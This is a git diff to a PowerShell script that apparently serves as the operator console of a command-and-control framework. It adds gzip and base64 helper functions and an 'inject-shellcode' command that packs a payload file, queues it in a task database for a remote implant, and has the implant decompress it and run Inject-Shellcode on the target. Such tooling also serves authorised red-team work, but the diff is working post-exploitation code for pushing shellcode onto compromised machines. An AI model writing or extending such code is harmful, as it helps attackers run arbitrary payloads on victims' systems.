@@ -1283,6 +1283,27 @@ elseif ($im_type -eq "Proxy"){
 }
 }
 
+function Get-CompressedByteArray ([byte[]] $byteArray) {
+    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
+    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+    $gzipStream.Write( $byteArray, 0, $byteArray.Length )
+    $gzipStream.Close()
+    $output.Close()
+    [Convert]::ToBase64String($output.ToArray())
+}
+
+
+function Get-DecompressedByteArray ([byte[]] $byteArray) {
+    $input = New-Object System.IO.MemoryStream( , $byteArray )
+	$output = New-Object System.IO.MemoryStream
+    $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	$gzipStream.CopyTo( $output )
+    $gzipStream.Close()
+	$input.Close()
+	[byte[]] $byteOutArray = $output.ToArray()
+    $byteOutArray
+
+}
 
 # run startup function
 startup
@@ -1303,6 +1324,22 @@ param
                    $params = Get-FileName -Dir "$($PoshPath)\Modules"
                    $pscommand = "$($pscommand) $($params)"
                 }
+            }
+            if ($pscommand.ToLower() -eq 'inject-shellcode')
+            {
+                CheckModuleLoaded "Inject-Shellcode.ps1" $psrandomuri
+                $fileName = Get-FileName -Dir "$FolderPath\payloads\"
+                $ScriptBytes = Get-Content "$fileName" -Encoding Byte
+                $base64Stream = Get-CompressedByteArray -byteArray $ScriptBytes
+                $Params = Read-Host "Any parameters?"
+
+                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                    RandomURI = $psrandomuri
+                    Command   = '$t="'+$base64Stream+'";$g = New-Object System.IO.Compression.GzipStream (New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($t))), ([IO.Compression.CompressionMode]::Decompress); $g.CopyTo(($o = New-Object System.IO.MemoryStream));'
+                } | Out-Null
+
+                $pscommand = "Inject-Shellcode -Shellcode (`$o.ToArray()) $Params"	
             }
             if ($pscommand)
             { 
